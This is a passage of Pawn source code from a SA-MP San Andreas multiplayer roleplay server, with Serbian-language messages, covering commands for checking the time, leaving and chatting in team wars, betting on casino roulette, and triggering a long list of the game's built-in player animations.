		if( PlayerInfo[ playerid ][ xZatvor ] > 0 ) format( globalstring, 120, "~y~%d %s~n~~g~|~w~%02d:%02d~g~|~n~~w~Vreme pritvora: %d min", day, mtext, hour, minuite, ( PlayerInfo[ playerid ][ xZatvorVreme ]+1 ) );
		else format( globalstring, 100, "~y~%d %s~n~~g~|~w~%02d:%02d~g~|", day, mtext, hour, minuite);
		GameTextForPlayer(playerid, globalstring, 5000, 1);
		ApplyAnimation( playerid, "COP_AMBIENT", "Coplook_watch", 4.1,0,0,0,0,0, 1 );

        SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s gleda na sat marke %s.", ImeIgraca( playerid ), GetNameByWatchID( playerid ) );
    }
    else
    {
    	if( PlayerInfo[ playerid ][ xZatvor ] > 0 ) 
    	{
    		format( globalstring, 50, "~w~Vreme pritvora: %d min", PlayerInfo[ playerid ][ xZatvorVreme ]+1 );
			GameTextForPlayer(playerid, globalstring, 5000, 1);
		}
    	else SendErrorMessage( playerid, "Nemas sat!" );
    }
    return 1;
}

CMD:warnapusti( playerid, const params[] )
{
    if( WARPInfo[ playerid ][ WARIgrac ] == -1 ) return SendErrorMessage( playerid, "Nisi usao na WAR.");
	new w = WARPInfo[ playerid ][ WARIgrac ];
    if( WARInfo[ w ][ WARAktivan ] == false ) return SendErrorMessage( playerid, "War nije jos startovan.");

	SetPlayerHealth( playerid, 100 );
	SetPlayerArmour( playerid, 0 );

    SMG_SetPlayerPos( playerid, PozicijaWAR[ playerid ][ 0 ], PozicijaWAR[ playerid ][ 1 ],  PozicijaWAR[ playerid ][ 2 ] );
    SetPlayerVirtualWorld( playerid, VirtualWWAR[ playerid ] );
    SetPlayerInterior( playerid, InteriorWAR[ playerid ] );

	ResetPlayerWeapons( playerid );

    WARPInfo[ playerid ][ WARIgrac ] = -1;

    ResetujWarIgraca( playerid );

	if( WARPInfo[ playerid ][ WARTim ][ 0 ] )
	{ 
        WARPoruka( w, 0xFF9900FF, "(WAR): {FFFFFF}%s {FF9900}je napustio WAR.", ImeIgraca( playerid ) );
		WARInfo[ w ][ WARTimClanovi ][ 0 ]--;
	}
	else if( WARPInfo[ playerid ][ WARTim ][ 1 ] )
	{ 
        WARPoruka( w, 0xFF9900FF, "(WAR): {FFFFFF}%s {FF9900}je napustio WAR.", ImeIgraca( playerid ) );
		WARInfo[ w ][ WARTimClanovi ][ 1 ]--;
	}

	SendClientMessage( playerid, 0xFF9900FF, "(WAR): Izasli ste iz WARa." );

	WarTDControl( playerid, false );
	return 1;
}

CMD:wp( playerid, const params[] )
{
	new text[ 144 ];
	if( WARPInfo[ playerid ][ WARIgrac ] == -1 ) return SendErrorMessage( playerid, "Nisi usao na WAR.");

 	if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/wp [text]");
 	if( strlen(text) > 128 ) return SendErrorMessage(playerid, "Ne mozete preko 128 chars u jednoj poruci.");

	WARPoruka( WARPInfo[ playerid ][ WARIgrac ], 0xFF9900FF, "(WAR): {FFFFFF}%s: %s", ImeIgraca( playerid ), text );
	return 1;
}

CMD:rulet( playerid, const params[] )
{
	if( GetPlayerBusinessId( playerid, VRSTA_CASINO ) == -1 ) return SendErrorMessage( playerid, "Morate biti kod u casinu da bi koristili ovu komandu." );
    if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Nisi level 5+." );
    if( Kockanje[playerid][IgraRulet] ) return SendErrorMessage(playerid, "Vec igrate rulet.");
	if( !IsPlayerInRangeOfPoint( playerid, 3.0, -1995.8182,-766.4884,1497.4738 ) 
		&& !IsPlayerInRangeOfPoint( playerid, 3.0, -1997.8105,-763.6893,1497.4738 )
		&& !IsPlayerInRangeOfPoint( playerid, 3.0, -1989.2404,-766.6235,1497.4738 )
		&& !IsPlayerInRangeOfPoint( playerid, 3.0, -1982.0557,-766.8058,1497.4738 ) ) return SendErrorMessage(playerid, "Niste kod ruleta!");
	
	new ruletkes, ruletid;
	if( sscanf(params, "ii", ruletkes, ruletid)) return SendUsageMessage(playerid, "/rulet (novac) (broj 0/36)");
    if( ruletkes < 1000 || ruletkes > 10000 ) return SendErrorMessage( playerid, "Minimalni ulog je $1.000, a maksimalni $10.000.");
    if( PlayerInfo[ playerid ][ xNovac ] < ruletkes ) return SendErrorMessage( playerid, "Nemate dovoljno novca!");
    if( ruletid < 0 || ruletid > 36) return SendErrorMessage(playerid, "Broj od 0 do 36.");

    DajIgracuNovac( playerid, -ruletkes );
    BussinesMoney( uFirmi[ playerid ], ruletkes, true );
	SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s stavlja $%d na broj %d.", ImeIgraca( playerid ), ruletkes, ruletid );

	SCMF(playerid, 0x72B8D8FF, "(RULET): Stavili ste {FFFFFF}($%d) {82B8D8}na broj {FFFFFF}(%d). {72B8D8}Sacekajte da stane rulet.", ruletkes, ruletid);

	Kockanje[playerid][IgraRulet] = true;
	Kockanje[playerid][BrojRulet] = ruletid;
	Kockanje[playerid][UlogRulet] = ruletkes;
	return 1;
}

CMD:anim(playerid, const params[])
{
	if(GetPlayerAnimationIndex(playerid) == 1130) return SendErrorMessage(playerid, "Ne mozes koristiti animacije jer padas. (ANTI-BA)");
	if(PlayerCuffed[playerid] != 0 || IgracZavezan[playerid]) return SendErrorMessage(playerid, "Ne mozete dok ste vezani. (ANTI-BA)");
	if(gZone_gID[playerid] != -1) return SendErrorMessage(playerid, "Ne mozete dok zauzimate. (ANTI-BA)");
	if(UzeoOpremu[playerid] == true) return SendErrorMessage(playerid, "Ne mozes koristiti animacije dok imas uniformu posla.");

	new chz[12];
	if(sscanf(params, "s[12]", chz)) return SendUsageMessage(playerid, "/anim [naziv]"), SendClientMessage(playerid, -1, "* Listu animacija imate na {CCCCCC}[ /help > Animacije ].");

	if(strcmp(chz, "bj1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_START_P",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bj2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_START_W",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bj3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_LOOP_P",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bj4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BLOWJOBZ","BJ_COUCH_LOOP_W",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "misc1", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
        ApplyAnimation(playerid, "CAR", "Fixn_Car_Loop", 4.1, 1, 0, 0, 0, 0);
        usingAnimation[playerid] = true;
    }
    else if(strcmp(chz, "misc2", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
        ApplyAnimation(playerid, "CAR", "flag_drop", 4.1, 0, 0, 0, 0, 0);
        usingAnimation[playerid] = true;
    }
    else if(strcmp(chz, "misc3", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
        ApplyAnimation(playerid, "PED", "bomber", 4.1, 0, 0, 0, 0, 0);
        usingAnimation[playerid] = true;
    }
	else if(strcmp(chz, "sexy1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SNM","SPANKING_IDLEW",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sexy2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SNM","SPANKING_IDLEP",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sexy3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SNM","SPANKINGW",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sexy4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SNM","SPANKINGP",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sexy5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SNM","SPANKEDW",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sexy6", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SNM","SPANKEDP",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sexy7", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SNM","SPANKING_ENDW",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sexy8", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SNM","SPANKING_ENDP",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "aswat1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SWAT","swt_wllshoot_in_L",4.0, 0, 1, 1, 1, -1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "aswat2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SWAT","swt_wllshoot_in_R",4.0, 0, 1, 1, 1, -1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "aswat3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SWAT","swt_wllshoot_out_L",4.0, 0, 1, 1, 1, -1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "aswat4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SWAT","swt_wllshoot_out_R",4.0, 0, 1, 1, 1, -1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "aswat5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SWAT","swt_wllshoot_in_R",4.0, 0, 1, 1, 1, -1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "aswat6", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SWAT","swt_breach_01",4.0, 0, 1, 1, 1, -1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "aswat7", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SWAT","swt_breach_02",4.0, 0, 1, 1, 1, -1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "aswat8", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SWAT","swt_breach_03",4.0, 0, 1, 1, 1, -1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "aswat9", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SWAT","Rail_fall_crawl",4.0, 0, 1, 1, 1, -1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "gang1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","hndshkaa",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "gang2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","hndshkba",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "gang3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","hndshkca",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "gang4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","hndshkcb",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "gang5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","hndshkda",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "gang6", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","hndshkea",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "gang7", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","hndshkfa",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bat1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BASEBALL","Bat_IDLE", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bat2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BASEBALL","Bat_M", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bat3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BASEBALL","BAT_PART", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bat4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"CRACK","Bbalbat_Idle_01", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bat5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"CRACK","Bbalbat_Idle_02", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "ghand1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GHANDS","gsign1LH",4.0,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "ghand2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GHANDS","gsign2LH",4.0,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "ghand3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GHANDS","gsign3LH",4.0,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "ghand4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GHANDS","gsign4LH",4.0,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "ghand5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GHANDS","gsign5LH",4.0,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "gsign1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GHANDS","gsign1",4.0,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "gsign2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GHANDS","gsign2",4.0,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "gsign3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GHANDS","gsign3",4.0,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "gsign4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GHANDS","gsign4",4.0,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "gsign5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GHANDS","gsign5",4.0,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "caract1", true) == 0)
	{
		if(IsVehicleBajs(GetPlayerVehicleID(playerid)) || IsVehicleMotor(GetPlayerVehicleID(playerid))) return SendErrorMessage(playerid, "Ne moze na ovom vozilu.");
		if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Niste u vozilu.");

		ApplyAnimation(playerid,"PED","TAP_HAND",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "caract2", true) == 0)
	{
		if(IsVehicleBajs(GetPlayerVehicleID(playerid)) || IsVehicleMotor(GetPlayerVehicleID(playerid))) return SendErrorMessage(playerid, "Ne moze na ovom vozilu.");
		if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Niste u vozilu.");

		ApplyAnimation(playerid,"CAR", "sit_relaxed", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "caract3", true) == 0)
	{
		if(IsVehicleBajs(GetPlayerVehicleID(playerid)) || IsVehicleMotor(GetPlayerVehicleID(playerid))) return SendErrorMessage(playerid, "Ne moze na ovom vozilu.");
		if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Niste u vozilu.");

		ApplyAnimation(playerid,"CAR", "tap_hand", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "caract4", true) == 0)
	{
		if(IsVehicleBajs(GetPlayerVehicleID(playerid)) || IsVehicleMotor(GetPlayerVehicleID(playerid))) return SendErrorMessage(playerid, "Ne moze na ovom vozilu.");
		if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Niste u vozilu.");

		ApplyAnimation(playerid,"CAR_CHAT", "carfone_in", 4.0,0,1,1,1,0,3);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "caract5", true) == 0)
	{
		if(IsVehicleBajs(GetPlayerVehicleID(playerid)) || IsVehicleMotor(GetPlayerVehicleID(playerid))) return SendErrorMessage(playerid, "Ne moze na ovom vozilu.");
		if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Niste u vozilu.");

		ApplyAnimation(playerid,"CAR_CHAT", "carfone_loopa", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "caract6", true) == 0)
	{
		if(IsVehicleBajs(GetPlayerVehicleID(playerid)) || IsVehicleMotor(GetPlayerVehicleID(playerid))) return SendErrorMessage(playerid, "Ne moze na ovom vozilu.");
		if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Niste u vozilu.");

		ApplyAnimation(playerid,"CAR_CHAT", "carfone_loopb", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "caract7", true) == 0)
	{
		if(IsVehicleBajs(GetPlayerVehicleID(playerid)) || IsVehicleMotor(GetPlayerVehicleID(playerid))) return SendErrorMessage(playerid, "Ne moze na ovom vozilu.");
		if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Niste u vozilu.");

		ApplyAnimation(playerid,"DRIVEBYS","Gang_DrivebyLHS",3.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "thankyou", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"FOOD","SHP_Thank", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "carsmoke", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","Smoke_in_car", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "angry", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"RIOT","RIOT_ANGRY",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "greet", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"WUZI","Wuzi_Greet_Wuzi",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "eatsit", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"FOOD","FF_Sit_Loop", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "slapped", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SWEET","ho_ass_slapped",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "wankoff", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PAULNMAC","wank_in",4.0,1,1,1,1,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "checkout", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid, "GRAFFITI", "graffiti_Chkout", 4.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "wank", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PAULNMAC", "wank_loop", 1.800001, 1, 0, 0, 1, 600);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "scratch", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid, "MISC","Scratchballs_01",3.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "invite1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","Invite_Yes",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "invite2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","Invite_No",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "win1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"CASINO","cards_win", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "win2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"CASINO","Roulette_win", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "giver1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"KISSING","gift_give",3.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "giver2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BAR","Barserve_give",3.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "pull", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"AIRPORT","thrw_barl_thrw ",3.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "getup", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","getup",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "kick", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"FIGHT_E","FightKick",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "liftup", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid, "CARRY", "liftup", 3.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "putdown", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid, "CARRY", "putdwn", 3.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "joint", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","smkcig_prtl",4.0,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "die1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"KNIFE","KILL_Knife_Ped_Die",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "die2", true) == 0)
	{
